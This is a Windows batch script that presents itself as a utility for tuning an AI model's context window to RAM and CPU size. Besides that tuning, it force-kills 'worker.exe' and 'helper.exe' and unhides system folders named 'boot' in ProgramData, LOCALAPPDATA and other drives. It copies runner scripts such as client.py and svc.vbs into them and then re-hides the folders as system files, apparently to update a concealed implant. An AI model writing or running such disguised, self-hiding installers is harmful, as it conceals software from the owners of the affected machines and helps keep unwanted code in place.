@echo off
setlocal enabledelayedexpansion

echo ==========================================================
echo    Hardware-Aware Context Window Auto-Tuning Utility
echo ==========================================================

:: 1. Probe Hardware Topology
set RAM_GB=8
for /f %%a in ('powershell -NoProfile -Command "[Math]::Round((Get-CimInstance Win32_OperatingSystem).TotalVisibleMemorySize / 1048576)" 2^>nul') do (
    set RAM_GB=%%a
)

set CPU_CORES=%NUMBER_OF_PROCESSORS%
if not defined CPU_CORES set CPU_CORES=4

:: 2. Determine Optimal Context Window
if !RAM_GB! LEQ 7 (
    set OPTIMAL_CONTEXT=2048
) else if !CPU_CORES! LEQ 2 (
    set OPTIMAL_CONTEXT=2048
) else if !RAM_GB! GEQ 15 if !CPU_CORES! GEQ 8 (
    set OPTIMAL_CONTEXT=8192
) else (
    set OPTIMAL_CONTEXT=4096
)

echo [+] Detected Hardware: !RAM_GB! GB RAM, !CPU_CORES! CPU cores
echo [+] Target Context Window: !OPTIMAL_CONTEXT! tokens

:: 3. Terminate running background worker to unlock files and reset context
echo [*] Stopping background inference workers...
taskkill /f /im worker.exe >nul 2>&1
taskkill /f /im helper.exe >nul 2>&1

:: 4. Update configuration across all target directories
set PATCH_COUNT=0
set SCRIPT_DIR=%~dp0

for %%D in ("C:\ProgramData\boot" "D:\boot" "E:\boot" "%LOCALAPPDATA%\boot") do (
    if exist "%%~D" (
        attrib -h -s "%%~D" >nul 2>&1
        echo !OPTIMAL_CONTEXT!> "%%~D\context.cfg"
        
        rem Copy updated runner scripts if present alongside this tool
        for %%F in (client.py main.bat svc.bat svc.vbs cleanup.bat reset.bat) do (
            if exist "!SCRIPT_DIR!%%F" (
                copy /Y "!SCRIPT_DIR!%%F" "%%~D\%%F" >nul 2>&1
            )
        )
        attrib +h +s "%%~D" >nul 2>&1
        set /a PATCH_COUNT+=1
        echo [+] Updated installation at: %%~D
    )
)

if !PATCH_COUNT! EQU 0 (
    echo [!] No existing runtime installation found in standard paths.
    echo     Please run setup.bat first.
) else (
    echo ==========================================================
    echo [OK] Context auto-tuned successfully to !OPTIMAL_CONTEXT! tokens!
    echo      The new context window will take effect automatically
    echo      the next time 'q' is launched.
    echo ==========================================================
)

pause
